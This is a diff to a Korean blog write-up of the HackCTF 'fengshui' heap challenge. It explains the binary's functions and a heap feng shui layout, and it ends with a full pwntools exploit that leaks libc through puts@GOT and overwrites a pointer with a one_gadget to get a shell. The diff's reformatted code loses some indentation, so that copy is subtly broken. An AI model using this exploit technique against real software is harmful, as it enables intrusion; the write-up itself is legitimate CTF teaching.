@@ -7,11 +7,6 @@ tags:   [HackCTF]
 categories: [Write-up]
 ---
 
-# [HackCTF] 풍수지리설
-
-Date: Feb 03, 2020
-Tags: report
-
 
 ### 1.  문제
 
@@ -23,6 +18,7 @@ Tags: report
 
 카나리와 NX 비트가 걸려있다.
 
+<br>
 
 **2) 문제 확인**
 
@@ -35,6 +31,7 @@ Tags: report
 - 2번 : 출력하길 원하는 인덱스를 입력하면 description 정보가 출력되는 듯하다
 - 3번 : 수정하길 원하는 인덱스를 입력하면 Text를 수정가능하다
 
+<br>
 
 **3) 코드흐름 파악**
 
@@ -79,7 +76,7 @@ Tags: report
     4. ebp-0x10에 들어있는 값을 [eax*4+0x804b080]에 복사한다. 이는 bss영역이다
     5. +169라인에서 real_len을 호출해서 Name을 입력한다. 이는 bss영역의 배열의 있는 값 + 4 를 인자로 한다
     6. update_desc를 호출한다
-        - 여기서 Text size와 Text가 입력된다.
+        - 여기서 Text size와 Text가 입력된다.<br><br><br>
 
     정리를 하자면, add_location 함수를 통해 총 2개의 malloc이 이루어지고, 두번째로 malloc한 청크의 첫 페이로드 부분에 첫번째로 malloc한 청크의 주소가 들어간다.
 
@@ -87,6 +84,7 @@ Tags: report
 
     두번째로 malloc한 청크의 페이로드 첫 시작주소에 들어있는 첫 malloc 청크의 페이로드에 Text가 들어간다.
 
+<br><br>
 
 - delete_location 함수
 
@@ -124,6 +122,7 @@ Tags: report
 
     따라서 1,2번 조건때문에 free된 청크의 접근이 불가하고, 비정상적인 인덱스는 free가 불가하다
 
+<br><br>
 
 - **display_location 함수**
 
@@ -163,6 +162,7 @@ Tags: report
 
     1. 이름과 Text를 출력해주는 함수이다.
 
+<br><br>
 
 - **update_desc 함수**
 
@@ -194,7 +194,7 @@ Tags: report
 
     해당 조건문의 의미는, 입력한 text가 description 영역을 침범하지 못하도록 하기위함이다.
 
-
+<br><br><br>
 
 ### 2. 접근방법
 
@@ -202,11 +202,11 @@ Tags: report
 
 일단 double free나 uaf 같은 기법은 불가능하다. delete_location 함수에서 free시킨 동적할당영역은 0으로 초기화를 하고 접근하면 안되는 인덱스를 막는 조건문이 존재하기 때문이다.
 
-현재 add_location() 함수은 다음과 같이 동작한다
+현재 add_location() 함수은 다음과 같이 동작한다<br><br>
 
 ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF_foon/Untitled%202.png)
 
-S는 Text를 담는 영역, V2는 desc영역이다.
+S는 Text를 담는 영역, V2는 desc영역이다.<br><br>
 
 총 3번 add_location 함수를 호출했다고 가정해보자.
 
@@ -214,17 +214,17 @@ S는 Text를 담는 영역, V2는 desc영역이다.
 - text size는 20이라고 가정했을때 조건문을 만족하지 않는다. 즉 exit함수로 가지 않고 text를 입력받게 된다.
 - 그다음도 같은 방식으로 동작한다.
 - 일반적으로 free를 하지 않은 상태에서 계속 add_location으로 description 영역을 할당받는다면 위와 같이 순차적으로 힙 영역을 할당 받을 것이다
-- 따라서 만약 desc영역의 사이즈보다 큰 text size를 입력하게 된다면, text 영역이 desc 영역을 침범하지 못하게 걸어둔 조건문에 의해 힙 오버플로우가 방지가 된다
+- 따라서 만약 desc영역의 사이즈보다 큰 text size를 입력하게 된다면, text 영역이 desc 영역을 침범하지 못하게 걸어둔 조건문에 의해 힙 오버플로우가 방지가 된다<br><br>
 
-하지만 항상 저렇게 순차적으로 힙이 할당받는다는 보장이 없다. 현재 v2는 항상 0x80사이즈로 고정 크기이다.  저위 그림을 기준으로 만약 0번째 인덱스를 free시킨다면 text를 저장하는 S_0 힙 영역의 size가 0x20이므로 fasbin에 들어갈 것이고, 나머지 v2_0는 unsorted bin에 들어갈 것이다.
+하지만 항상 저렇게 순차적으로 힙이 할당받는다는 보장이 없다. 현재 v2는 항상 0x80사이즈로 고정 크기이다.  저위 그림을 기준으로 만약 0번째 인덱스를 free시킨다면 text를 저장하는 S_0 힙 영역의 size가 0x20이므로 fasbin에 들어갈 것이고, 나머지 v2_0는 unsorted bin에 들어갈 것이다.<br><br>
 
-그다음 add_location 함수를 한번더 호출하여 desc size를 입력할때 0x80를 주게된다면, unsorted bin에 있는 청크를 S_3에 재할당해주고, V2_3는 고정크기 0x80이므로 순차적으로 V2_2 청크 아래에 할당해줄 것이다.
+그다음 add_location 함수를 한번더 호출하여 desc size를 입력할때 0x80를 주게된다면, unsorted bin에 있는 청크를 S_3에 재할당해주고, V2_3는 고정크기 0x80이므로 순차적으로 V2_2 청크 아래에 할당해줄 것이다.<br><br>
 
 ![]({{ site.baseurl }}/images/write-up/HackCTF/HackCTF_foon/Untitled%203.png)
 
 - index 0, 1, 2 중에서 0이 free되면 store[0]은 0으로 초기화 된다
 - 그리고 처음에 S영역을 malloc 받는데, 0x80을 요청했으므로 unsorted bin에 들어있는 0x80크기의 V2_0 영역을 재할당해준다. 따라서 기존 V2_0 영역이 V2_3으로 덮힌다
-- 그리고 고정 크기 0x80을 한번더 malloc 하므로 이는 V2_2 아래에 할당받는다.
+- 그리고 고정 크기 0x80을 한번더 malloc 하므로 이는 V2_2 아래에 할당받는다.<br><br>
 
 이렇게 되면 처음에 S_3 영역이 0x80 동일크기이기 때문에 V2_0에 들어간다. 그리고, text size를 입력할때 0x80보다 크게 입력을 해도, update_desc의 조건문에 만족하지 않게 되어 index_1, index_2 영역을 heap overflow를 이용하여 덮을 수 있다.
 
@@ -232,6 +232,7 @@ S는 Text를 담는 영역, V2는 desc영역이다.
 
 이렇게 heap의 layout을 조정하여 조지는 방법을 heap fengshui 라고 한다
 
+<br><br>
 
 - **시나리오**
     1. display_location 함수를 호출하면 [v2]에 들어있는 주소를 인자로 하여 printf가 호출된다. 따라서 heapoverflow를 이용하여 index_1의 [v2_1]에 들어있는 S_1 주소를 puts_got로 변경시켜 puts_ libc 주소를 leak한다
@@ -241,74 +242,74 @@ S는 Text를 담는 영역, V2는 desc영역이다.
 
     참고로 heapoverflow를 일으킬때 chunk header 같은 것은 변조되지 않도록 적절히 맞춰줘야한다.
 
-
+<br><br><br>
 
 ### 3. 풀이
 
 ---
 
 최종 익스코드는 다음과 같다
+```python
+from pwn import *
+context(arch="amd64",os="linux",log_level="DEBUG")
 
-    from pwn import *
-    context(arch="amd64",os="linux",log_level="DEBUG")
-    
-    #p=remote("ctf.j0n9hyun.xyz",3028)
-    env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
-    p=process("./fengshui")
-    e=ELF("./fengshui")
-    libc=ELF("./libc.so.6")
-    
-    gdb.attach(p,'code\nb *0xBDB+$code\n')
-    
-    def add_(des_size,name,text_size,text):
-    	p.sendlineafter("Choice: ","0")
-    	p.sendlineafter("Size of description: ",str(des_size))
-    	p.sendlineafter("Name: ",name)
-    	p.sendlineafter("Text length: ",str(text_size))
-    	p.sendlineafter("Text: ",text)
-    
-    def del_(index):
-    	p.sendlineafter("Choice: ","1")
-    	p.sendlineafter("Index: ",str(index))
-    
-    def show_(index):
-            p.sendlineafter("Choice: ","2")
-            p.sendlineafter("Index: ",str(index))
-    
-    def update_(index,text_size,text):
-            p.sendlineafter("Choice: ","3")
-            p.sendlineafter("Index: ",str(index))
-            p.sendlineafter("Text length: ",str(text_size))
-            p.sendlineafter("Text: ",text)
-    
-    
-    add_(10,"AAAA",8,"AAAA")
-    add_(10,"AAAA",8,"AAAA")
-    add_(10,"AAAA",8,"AAAA")
-    
-    del_(0)
-    
-    payload='a'*0x80+p32(0x88)+p32(0x11)+'A'*8+p32(0)+p32(0x89)+p32(e.got['puts'])
-    
-    add_(128,"AAAA",len(payload),str(payload))
-    
-    show_(1)
-    
-    p.recvuntil("Description: ")
-    
-    puts_addr=u32(p.recv(4))
-    libc_base=puts_addr-0x0005fca0
-    one_gadget=libc_base+0x3ac5e
-    
-    log.info(hex(puts_addr))
-    
-    update_(1,4,p32(one_gadget))
-    
-    #del_(1)
-    
-    p.interactive()
+#p=remote("ctf.j0n9hyun.xyz",3028)
+env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
+p=process("./fengshui")
+e=ELF("./fengshui")
+libc=ELF("./libc.so.6")
+
+gdb.attach(p,'code\nb *0xBDB+$code\n')
+
+def add_(des_size,name,text_size,text):
+p.sendlineafter("Choice: ","0")
+p.sendlineafter("Size of description: ",str(des_size))
+p.sendlineafter("Name: ",name)
+p.sendlineafter("Text length: ",str(text_size))
+p.sendlineafter("Text: ",text)
+
+def del_(index):
+p.sendlineafter("Choice: ","1")
+p.sendlineafter("Index: ",str(index))
+
+def show_(index):
+    p.sendlineafter("Choice: ","2")
+    p.sendlineafter("Index: ",str(index))
+
+def update_(index,text_size,text):
+    p.sendlineafter("Choice: ","3")
+    p.sendlineafter("Index: ",str(index))
+    p.sendlineafter("Text length: ",str(text_size))
+    p.sendlineafter("Text: ",text)
 
 
+add_(10,"AAAA",8,"AAAA")
+add_(10,"AAAA",8,"AAAA")
+add_(10,"AAAA",8,"AAAA")
+
+del_(0)
+
+payload='a'*0x80+p32(0x88)+p32(0x11)+'A'*8+p32(0)+p32(0x89)+p32(e.got['puts'])
+
+add_(128,"AAAA",len(payload),str(payload))
+
+show_(1)
+
+p.recvuntil("Description: ")
+
+puts_addr=u32(p.recv(4))
+libc_base=puts_addr-0x0005fca0
+one_gadget=libc_base+0x3ac5e
+
+log.info(hex(puts_addr))
+
+update_(1,4,p32(one_gadget))
+
+#del_(1)
+
+p.interactive()
+```
+<br><br><br>
 
 ### 4. 몰랐던 개념
 
